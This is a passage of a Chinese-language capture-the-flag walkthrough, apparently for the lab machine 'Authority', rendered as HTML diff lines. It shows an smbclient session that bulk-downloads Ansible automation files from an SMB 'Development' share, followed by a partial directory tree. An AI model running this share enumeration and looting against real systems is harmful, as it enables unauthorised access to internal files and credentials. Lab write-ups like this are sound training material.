+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        NETLOGON                        Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        SYSVOL                          Logon server share
+</span></span></code></pre></div><p>连接 Department，将文件夹下载下来。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient //10.129.229.56/Development -U <span style="color:#e6db74">&#39;enil&#39;</span>
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\e</span>nil<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> prompt on
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> recurse off
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> mget *
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\.</span>ansible-lint of size <span style="color:#ae81ff">259</span> as Automation/Ansible/ADCS/.ansible-lint <span style="color:#f92672">(</span>0.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\.</span>yamllint of size <span style="color:#ae81ff">205</span> as Automation/Ansible/ADCS/.yamllint <span style="color:#f92672">(</span>0.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\L</span>ICENSE of size <span style="color:#ae81ff">11364</span> as Automation/Ansible/ADCS/LICENSE <span style="color:#f92672">(</span>14.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 5.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\R</span>EADME.md of size <span style="color:#ae81ff">7279</span> as Automation/Ansible/ADCS/README.md <span style="color:#f92672">(</span>11.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 6.6 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\r</span>equirements.txt of size <span style="color:#ae81ff">466</span> as Automation/Ansible/ADCS/requirements.txt <span style="color:#f92672">(</span>1.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 5.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\r</span>equirements.yml of size <span style="color:#ae81ff">264</span> as Automation/Ansible/ADCS/requirements.yml <span style="color:#f92672">(</span>0.5 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 5.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\S</span>ECURITY.md of size <span style="color:#ae81ff">924</span> as Automation/Ansible/ADCS/SECURITY.md <span style="color:#f92672">(</span>1.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 4.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\t</span>ox.ini of size <span style="color:#ae81ff">419</span> as Automation/Ansible/ADCS/tox.ini <span style="color:#f92672">(</span>0.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.9 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\.</span>travis.yml of size <span style="color:#ae81ff">1414</span> as Automation/Ansible/LDAP/.travis.yml <span style="color:#f92672">(</span>1.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\R</span>EADME.md of size <span style="color:#ae81ff">5768</span> as Automation/Ansible/LDAP/README.md <span style="color:#f92672">(</span>10.6 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 4.2 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\T</span>ODO.md of size <span style="color:#ae81ff">119</span> as Automation/Ansible/LDAP/TODO.md <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\V</span>agrantfile of size <span style="color:#ae81ff">640</span> as Automation/Ansible/LDAP/Vagrantfile <span style="color:#f92672">(</span>1.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.6 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\P</span>WM<span style="color:#ae81ff">\a</span>nsible.cfg of size <span style="color:#ae81ff">491</span> as Automation/Ansible/PWM/ansible.cfg <span style="color:#f92672">(</span>0.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\P</span>WM<span style="color:#ae81ff">\a</span>nsible_inventory of size <span style="color:#ae81ff">174</span> as Automation/Ansible/PWM/ansible_inventory <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\P</span>WM<span style="color:#ae81ff">\R</span>EADME.md of size <span style="color:#ae81ff">1290</span> as Automation/Ansible/PWM/README.md <span style="color:#f92672">(</span>1.8 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.0 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\d</span>efaults<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">1578</span> as Automation/Ansible/ADCS/defaults/main.yml <span style="color:#f92672">(</span>3.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.0 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\m</span>eta<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">549</span> as Automation/Ansible/ADCS/meta/main.yml <span style="color:#f92672">(</span>0.5 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\m</span>eta<span style="color:#ae81ff">\p</span>references.yml of size <span style="color:#ae81ff">22</span> as Automation/Ansible/ADCS/meta/preferences.yml <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\t</span>asks<span style="color:#ae81ff">\a</span>ssert.yml of size <span style="color:#ae81ff">2936</span> as Automation/Ansible/ADCS/tasks/assert.yml <span style="color:#f92672">(</span>4.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\t</span>asks<span style="color:#ae81ff">\g</span>enerate_ca_certs.yml of size <span style="color:#ae81ff">2262</span> as Automation/Ansible/ADCS/tasks/generate_ca_certs.yml <span style="color:#f92672">(</span>3.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\t</span>asks<span style="color:#ae81ff">\i</span>nit_ca.yml of size <span style="color:#ae81ff">1244</span> as Automation/Ansible/ADCS/tasks/init_ca.yml <span style="color:#f92672">(</span>1.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\t</span>asks<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">1359</span> as Automation/Ansible/ADCS/tasks/main.yml <span style="color:#f92672">(</span>2.6 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\t</span>asks<span style="color:#ae81ff">\r</span>equests.yml of size <span style="color:#ae81ff">4214</span> as Automation/Ansible/ADCS/tasks/requests.yml <span style="color:#f92672">(</span>7.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.9 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\t</span>emplates<span style="color:#ae81ff">\e</span>xtensions.cnf.j2 of size <span style="color:#ae81ff">1659</span> as Automation/Ansible/ADCS/templates/extensions.cnf.j2 <span style="color:#f92672">(</span>2.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.9 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\t</span>emplates<span style="color:#ae81ff">\o</span>penssl.cnf.j2 of size <span style="color:#ae81ff">11294</span> as Automation/Ansible/ADCS/templates/openssl.cnf.j2 <span style="color:#f92672">(</span>18.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\v</span>ars<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">2146</span> as Automation/Ansible/ADCS/vars/main.yml <span style="color:#f92672">(</span>3.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\.</span>bin<span style="color:#ae81ff">\c</span>lean_vault of size <span style="color:#ae81ff">677</span> as Automation/Ansible/LDAP/.bin/clean_vault <span style="color:#f92672">(</span>1.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\.</span>bin<span style="color:#ae81ff">\d</span>iff_vault of size <span style="color:#ae81ff">357</span> as Automation/Ansible/LDAP/.bin/diff_vault <span style="color:#f92672">(</span>0.6 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\.</span>bin<span style="color:#ae81ff">\s</span>mudge_vault of size <span style="color:#ae81ff">768</span> as Automation/Ansible/LDAP/.bin/smudge_vault <span style="color:#f92672">(</span>1.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.2 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\d</span>efaults<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">1046</span> as Automation/Ansible/LDAP/defaults/main.yml <span style="color:#f92672">(</span>1.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\f</span>iles<span style="color:#ae81ff">\p</span>am_mkhomedir of size <span style="color:#ae81ff">170</span> as Automation/Ansible/LDAP/files/pam_mkhomedir <span style="color:#f92672">(</span>0.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.0 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\h</span>andlers<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">277</span> as Automation/Ansible/LDAP/handlers/main.yml <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.9 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\m</span>eta<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">416</span> as Automation/Ansible/LDAP/meta/main.yml <span style="color:#f92672">(</span>0.5 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\t</span>asks<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">5235</span> as Automation/Ansible/LDAP/tasks/main.yml <span style="color:#f92672">(</span>5.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.9 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\t</span>emplates<span style="color:#ae81ff">\l</span>dap_sudo_groups.j2 of size <span style="color:#ae81ff">131</span> as Automation/Ansible/LDAP/templates/ldap_sudo_groups.j2 <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\t</span>emplates<span style="color:#ae81ff">\l</span>dap_sudo_users.j2 of size <span style="color:#ae81ff">106</span> as Automation/Ansible/LDAP/templates/ldap_sudo_users.j2 <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\t</span>emplates<span style="color:#ae81ff">\s</span>ssd.conf.j2 of size <span style="color:#ae81ff">2556</span> as Automation/Ansible/LDAP/templates/sssd.conf.j2 <span style="color:#f92672">(</span>3.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\t</span>emplates<span style="color:#ae81ff">\s</span>udo_group.j2 of size <span style="color:#ae81ff">30</span> as Automation/Ansible/LDAP/templates/sudo_group.j2 <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\v</span>ars<span style="color:#ae81ff">\d</span>ebian.yml of size <span style="color:#ae81ff">174</span> as Automation/Ansible/LDAP/vars/debian.yml <span style="color:#f92672">(</span>0.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\v</span>ars<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">75</span> as Automation/Ansible/LDAP/vars/main.yml <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.6 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\v</span>ars<span style="color:#ae81ff">\r</span>edhat.yml of size <span style="color:#ae81ff">222</span> as Automation/Ansible/LDAP/vars/redhat.yml <span style="color:#f92672">(</span>0.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.6 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\L</span>DAP<span style="color:#ae81ff">\v</span>ars<span style="color:#ae81ff">\u</span>buntu-14.04.yml of size <span style="color:#ae81ff">203</span> as Automation/Ansible/LDAP/vars/ubuntu-14.04.yml <span style="color:#f92672">(</span>0.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.5 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\P</span>WM<span style="color:#ae81ff">\d</span>efaults<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">1591</span> as Automation/Ansible/PWM/defaults/main.yml <span style="color:#f92672">(</span>2.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.5 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\P</span>WM<span style="color:#ae81ff">\h</span>andlers<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">4</span> as Automation/Ansible/PWM/handlers/main.yml <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.5 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\P</span>WM<span style="color:#ae81ff">\m</span>eta<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">199</span> as Automation/Ansible/PWM/meta/main.yml <span style="color:#f92672">(</span>0.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\P</span>WM<span style="color:#ae81ff">\t</span>asks<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">1832</span> as Automation/Ansible/PWM/tasks/main.yml <span style="color:#f92672">(</span>1.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\P</span>WM<span style="color:#ae81ff">\t</span>emplates<span style="color:#ae81ff">\c</span>ontext.xml.j2 of size <span style="color:#ae81ff">422</span> as Automation/Ansible/PWM/templates/context.xml.j2 <span style="color:#f92672">(</span>0.6 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\P</span>WM<span style="color:#ae81ff">\t</span>emplates<span style="color:#ae81ff">\t</span>omcat-users.xml.j2 of size <span style="color:#ae81ff">388</span> as Automation/Ansible/PWM/templates/tomcat-users.xml.j2 <span style="color:#f92672">(</span>0.6 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\S</span>HARE<span style="color:#ae81ff">\t</span>asks<span style="color:#ae81ff">\m</span>ain.yml of size <span style="color:#ae81ff">1876</span> as Automation/Ansible/SHARE/tasks/main.yml <span style="color:#f92672">(</span>4.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\m</span>olecule<span style="color:#ae81ff">\d</span>efault<span style="color:#ae81ff">\c</span>onverge.yml of size <span style="color:#ae81ff">106</span> as Automation/Ansible/ADCS/molecule/default/converge.yml <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\m</span>olecule<span style="color:#ae81ff">\d</span>efault<span style="color:#ae81ff">\m</span>olecule.yml of size <span style="color:#ae81ff">526</span> as Automation/Ansible/ADCS/molecule/default/molecule.yml <span style="color:#f92672">(</span>0.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\A</span>utomation<span style="color:#ae81ff">\A</span>nsible<span style="color:#ae81ff">\A</span>DCS<span style="color:#ae81ff">\m</span>olecule<span style="color:#ae81ff">\d</span>efault<span style="color:#ae81ff">\p</span>repare.yml of size <span style="color:#ae81ff">371</span> as Automation/Ansible/ADCS/molecule/default/prepare.yml <span style="color:#f92672">(</span>0.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.2 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> exit
+</span></span></code></pre></div><p>查看结构。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tree
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>└── Automation
+</span></span><span style="display:flex;"><span>    └── Ansible
+</span></span><span style="display:flex;"><span>        ├── ADCS
+</span></span><span style="display:flex;"><span>        │   ├── defaults
+</span></span><span style="display:flex;"><span>        │   │   └── main.yml
+</span></span><span style="display:flex;"><span>        │   ├── LICENSE
+</span></span><span style="display:flex;"><span>        │   ├── meta
+</span></span><span style="display:flex;"><span>        │   │   ├── main.yml
+</span></span><span style="display:flex;"><span>        │   │   └── preferences.yml
+</span></span><span style="display:flex;"><span>        │   ├── molecule
+</span></span><span style="display:flex;"><span>        │   │   └── default
+</span></span><span style="display:flex;"><span>        │   │       ├── converge.yml
+</span></span><span style="display:flex;"><span>        │   │       ├── molecule.yml
+</span></span><span style="display:flex;"><span>        │   │       └── prepare.yml
+</span></span><span style="display:flex;"><span>        │   ├── README.md
+</span></span><span style="display:flex;"><span>        │   ├── requirements.txt
+</span></span><span style="display:flex;"><span>        │   ├── requirements.yml
+</span></span><span style="display:flex;"><span>        │   ├── SECURITY.md
+</span></span><span style="display:flex;"><span>        │   ├── tasks
+</span></span><span style="display:flex;"><span>        │   │   ├── assert.yml
